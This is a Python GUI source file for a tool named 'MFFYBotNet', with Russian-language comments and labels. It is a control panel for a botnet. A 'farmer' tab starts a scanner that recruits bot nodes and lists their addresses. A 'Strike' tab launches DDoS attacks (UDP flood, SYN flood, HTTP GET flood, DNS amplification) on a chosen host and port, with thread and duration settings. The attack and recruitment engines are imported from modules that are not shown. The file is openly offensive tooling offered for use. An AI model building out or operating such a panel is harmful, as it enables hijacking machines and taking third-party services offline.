import customtkinter as ctk
import sys
import os
import threading
import time
from gui.styles import THEME, FONTS, get_card_style, get_button_primary, get_button_secondary, get_entry_style, get_combo_style
from core.farmer_logic import MFFYFarmer
from core.attack_logic import MFFYAttacker

# ─── КЛАССЫ ПАНЕЛЕЙ (ФРЕЙМОВ) ──────────────────────────────────────────────────

class DashboardFrame(ctk.CTkFrame):
    """ Главная панель управления (Дашборд). """
    def __init__(self, master, app):
        super().__init__(master, fg_color="transparent")
        self.app = app
        self.grid_columnconfigure((0,1), weight=1)
        self.grid_rowconfigure(1, weight=1)

        # Ряд статистики
        self.stats_inner = ctk.CTkFrame(self, fg_color="transparent")
        self.stats_inner.grid(row=0, column=0, columnspan=2, sticky="ew", pady=(0, 20))
        self.stats_inner.grid_columnconfigure((0,1,2,3), weight=1)

        self.stat_labels = []
        labels = ["ВЕРБОВАНО ВСЕГО", "УЗЛОВ ОНЛАЙН", "РЕФЛЕКТОРОВ", "АКТИВНЫХ АТАК"]
        colors = [THEME["accent_primary"], THEME["success"], THEME["accent_secondary"], THEME["error"]]
        
        for i, (label, color) in enumerate(zip(labels, colors)):
            card = ctk.CTkFrame(self.stats_inner, **get_card_style())
            card.grid(row=0, column=i, padx=5, sticky="nsew")
            ctk.CTkLabel(card, text=label, font=FONTS["body"], text_color=THEME["text_dim"]).pack(pady=(15, 0))
            lbl = ctk.CTkLabel(card, text="0", font=FONTS["stats"], text_color=color)
            lbl.pack(pady=(5, 15))
            self.stat_labels.append(lbl)

        # Быстрый Контроль
        self.ctrl = ctk.CTkFrame(self, **get_card_style())
        self.ctrl.grid(row=1, column=0, sticky="nsew", padx=(0, 10))
        ctk.CTkLabel(self.ctrl, text="QUICK DDOS", font=FONTS["header"]).pack(pady=20, padx=20, anchor="w")
        
        ctk.CTkLabel(self.ctrl, text="ЦЕЛЬ").pack(padx=20, anchor="w")
        self.target_entry = ctk.CTkEntry(self.ctrl, placeholder_text="1.1.1.1", width=300, **get_entry_style())
        self.target_entry.pack(pady=5, padx=20)
        
        self.launch_btn = ctk.CTkButton(self.ctrl, text="ИНИЦИАЛИЗАЦИЯ", command=self.app._toggle_attack, **get_button_primary())
        self.launch_btn.pack(pady=20, padx=20, fill="x")

        # Мини Лог
        self.log_fr = ctk.CTkFrame(self, **get_card_style())
        self.log_fr.grid(row=1, column=1, sticky="nsew", padx=(10, 0))
        ctk.CTkLabel(self.log_fr, text="СИСТЕМНЫЙ ПОТОК", font=FONTS["header"]).pack(pady=20, padx=20, anchor="w")
        self.log_box = ctk.CTkTextbox(self.log_fr, fg_color="#000000", font=FONTS["mono"], text_color=THEME["success"])
        self.log_box.pack(expand=True, fill="both", padx=20, pady=(0, 20))

    def update_stats(self):
        """ Обновление показателей статистики в реальном времени. """
        try:
            self.stat_labels[0].configure(text=f"{self.app.farmer.total_recruited:,}")
            self.stat_labels[1].configure(text=f"{len(self.app.farmer.bots):,}")
            self.stat_labels[3].configure(text="1" if self.app.attacker.is_active else "0")
        except: pass

class FarmerFrame(ctk.CTkFrame):
    """ Панель управления фармером (вербовкой ботов). """
    def __init__(self, master, app):
        super().__init__(master, fg_color="transparent")
        self.app = app
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        # Контроль Фармера
        self.top = ctk.CTkFrame(self, **get_card_style())
        self.top.grid(row=0, column=0, sticky="ew", pady=(0, 20))
        
        self.farm_btn = ctk.CTkButton(self.top, text="НАЧАТЬ ВЕРБОВКУ", command=self.app._toggle_farming, **get_button_primary())
        self.farm_btn.pack(side="left", padx=20, pady=20)
        
        self.status_lbl = ctk.CTkLabel(self.top, text="СКАНЕР: НЕАКТИВЕН", font=FONTS["header"], text_color=THEME["text_dim"])
        self.status_lbl.pack(side="right", padx=20)

        # Список ботов
        self.table_fr = ctk.CTkFrame(self, **get_card_style())
        self.table_fr.grid(row=1, column=0, sticky="nsew")
        ctk.CTkLabel(self.table_fr, text="ЗАВЕРБОВАННЫЕ УЗЛЫ", font=FONTS["header"]).pack(pady=10)
        
        self.bot_list = ctk.CTkTextbox(self.table_fr, fg_color="#000000", font=FONTS["mono"])
        self.bot_list.pack(expand=True, fill="both", padx=20, pady=20)

    def refresh(self):
        """ Обновление визуального списка ботов. """
        txt = f"{'АДРЕС':<25} | {'ТИП':<10} | {'СТАТУС':<10}\n" + "─"*50 + "\n"
        for b in self.app.farmer.bots:
            txt += f"{b.get('addr',''):<25} | {b.get('type','').upper():<10} | ОНЛАЙН\n"
        self.bot_list.delete("0.0", "end")
        self.bot_list.insert("0.0", txt)
        
        st = "АКТИВЕН" if self.app.farmer.is_running else "НЕАКТИВЕН"
        color = THEME["success"] if self.app.farmer.is_running else THEME["text_dim"]
        self.status_lbl.configure(text=f"СКАНЕР: {st}", text_color=color)

class StrikeFrame(ctk.CTkFrame):
    """ Панель продвинутого центра атак. """
    def __init__(self, master, app):
        super().__init__(master, fg_color="transparent")
        self.app = app
        self.grid_columnconfigure(0, weight=1)
        
        ctk.CTkLabel(self, text="DDOS CONTROL - ADVANCED CONFIGURATION", font=FONTS["title"], text_color=THEME["error"]).pack(pady=30)
        
        self.conf = ctk.CTkFrame(self, **get_card_style())
        self.conf.pack(pady=10, padx=100, fill="both")
        
        # Инфо о цели
        ctk.CTkLabel(self.conf, text="ЦЕЛЕВОЙ ХОСТ / IP", font=FONTS["body"]).pack(pady=(20,0))
        self.target_entry = ctk.CTkEntry(self.conf, placeholder_text="example.com", width=400, **get_entry_style())
        self.target_entry.pack(pady=5)
        
        ctk.CTkLabel(self.conf, text="ПОРТ", font=FONTS["body"]).pack(pady=(10,0))
        self.port_entry = ctk.CTkEntry(self.conf, placeholder_text="80", width=100, **get_entry_style())
        self.port_entry.pack(pady=5)

        # Метод атаки
        ctk.CTkLabel(self.conf, text="МЕТОД АТАКИ", font=FONTS["body"]).pack(pady=(10,0))
        self.method_dropdown = ctk.CTkComboBox(self.conf, values=["UDP_FLOOD", "SYN_FLOOD", "HTTP_GET", "DNS_AMP"], width=300, **get_combo_style())
        self.method_dropdown.pack(pady=5)

        # Дополнительно
        self.adv = ctk.CTkFrame(self.conf, fg_color="transparent")
        self.adv.pack(pady=20)
        self.adv.grid_columnconfigure((0,1), weight=1)

        ctk.CTkLabel(self.adv, text="ПОТОКИ").grid(row=0, column=0, padx=20)
        self.threads_entry = ctk.CTkEntry(self.adv, placeholder_text="500", width=100, **get_entry_style())
        self.threads_entry.grid(row=1, column=0, pady=5)

        ctk.CTkLabel(self.adv, text="ДЛИТЕЛЬНОСТЬ (С)").grid(row=0, column=1, padx=20)
        self.dur_entry = ctk.CTkEntry(self.adv, placeholder_text="600", width=100, **get_entry_style())
        self.dur_entry.grid(row=1, column=1, pady=5)

        self.launch_btn = ctk.CTkButton(self.conf, text="ЗАПУСТИТЬ ОПЕРАЦИЮ", command=self._start_strike, **get_button_primary())
        self.launch_btn.pack(pady=30, padx=100, fill="x")

    def _start_strike(self):
        """ Обработчик кнопки запуска атаки из расширенного меню. """
        target = self.target_entry.get().strip()
        port_txt = self.port_entry.get().strip()
        port = int(port_txt) if port_txt.isdigit() else 80
        method = self.method_dropdown.get()
        thr_txt = self.threads_entry.get().strip()
        threads = int(thr_txt) if thr_txt.isdigit() else 500
        dur_txt = self.dur_entry.get().strip()
        duration = int(dur_txt) if dur_txt.isdigit() else 600
        
        if not self.app.attacker.is_active:
            self.app.attacker.start_attack(target, port, method, threads=threads, duration=duration)
            self.launch_btn.configure(text="ПРЕРВАТЬ УДАР", fg_color=THEME["error"], hover_color="#CC0000")
        else:
            self.app.attacker.stop_attack()
            self.launch_btn.configure(text="ЗАПУСТИТЬ ОПЕРАЦИЮ", **get_button_primary())

class LogsFrame(ctk.CTkFrame):
    """ Панель расширенных логов системы. """
    def __init__(self, master, app):
        super().__init__(master, fg_color="transparent")
        self.app = app
        self.log_box = ctk.CTkTextbox(self, fg_color="#000000", font=FONTS["mono"], text_color=THEME["success"])
        self.log_box.pack(expand=True, fill="both", padx=20, pady=20)

# ─── ГЛАВНОЕ ПРИЛОЖЕНИЕ MFFYBOTNET ───────────────────────────────────────────

class MFFYBotNetApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("MFFYBotNet | УПРАВЛЕНИЕ И СТРАТЕГИЯ")
        self.geometry("1400x850")
        self.configure(fg_color=THEME["bg_dark"])

        # Компоненты логики
        self.farmer = MFFYFarmer(log_callback=self._log_msg)
        self.attacker = MFFYAttacker(log_callback=self._log_msg)

        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # Боковая панель
        self.sidebar = ctk.CTkFrame(self, width=280, fg_color=THEME["bg_card"], border_color=THEME["border"], border_width=1)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        ctk.CTkLabel(self.sidebar, text="MFFYBOTNET", font=FONTS["title"], text_color=THEME["accent_primary"]).pack(pady=40)

        # Система переключения вкладок
        self.frames = {}
        for name, icon, label_ru in [("Dashboard", "📡", "AMPLIFICATION"), ("Farmer", "🚜", "ФАРМЕР"), ("Strike", "⚔️", "DDOS"), ("Logs", "📜", "ЛОГИ")]:
            self.frames[name] = globals()[f"{name}Frame"](self, self)
            btn = ctk.CTkButton(self.sidebar, text=f"  {icon}  {label_ru or name.upper()}", anchor="w", 
                               command=lambda n=name: self.select_frame(n), **get_button_secondary())
            btn.pack(pady=5, padx=20, fill="x")

        self.select_frame("Dashboard") # По умолчанию открываем Дашборд
        threading.Thread(target=self._global_updater, daemon=True).start()

    def select_frame(self, name):
        """ Переключение между активными кадрами (вкладками). """
        for f in self.frames.values(): f.grid_forget()
        self.frames[name].grid(row=0, column=1, sticky="nsew", padx=30, pady=30)
        self.current_frame = name

    def _log_msg(self, msg):
        """ Маршрутизация сообщений логов во все необходимые поля. """
        ts = time.strftime("%H:%M:%S")
        full_msg = f"[{ts}] {msg}\n"
        def _upd():
            self.frames["Dashboard"].log_box.insert("end", full_msg)
            self.frames["Dashboard"].log_box.see("end")
            self.frames["Logs"].log_box.insert("end", full_msg)
            self.frames["Logs"].log_box.see("end")
        self.after(0, _upd)

    def _toggle_attack(self):
        """ Обработчик кнопки запуска атаки на главной панели. """
        if not self.attacker.is_active:
            target = self.frames["Dashboard"].target_entry.get().strip() or "1.1.1.1"
            self.attacker.start_attack(target, 80, "UDP_FLOOD")
            self.frames["Dashboard"].launch_btn.configure(text="ПРЕРВАТЬ", fg_color=THEME["error"])
        else:
            self.attacker.stop_attack()
            self.frames["Dashboard"].launch_btn.configure(text="ИНИЦИАЛИЗАЦИЯ", **get_button_primary())

    def _toggle_farming(self):
        """ Переключение состояния фарм-сканера. """
        if not self.farmer.is_running:
            self.farmer.start_scanning()
        else:
            self.farmer.stop_scanning()
        self.frames["Farmer"].refresh()

    def _global_updater(self):
        """ Поток для периодического обновления данных во всех окнах. """
        while True:
            time.sleep(1)
            self.after(0, self.frames["Dashboard"].update_stats)
            if self.current_frame == "Farmer":
                self.after(0, self.frames["Farmer"].refresh)

if __name__ == "__main__":
    app = MFFYBotNetApp()
    app.mainloop()
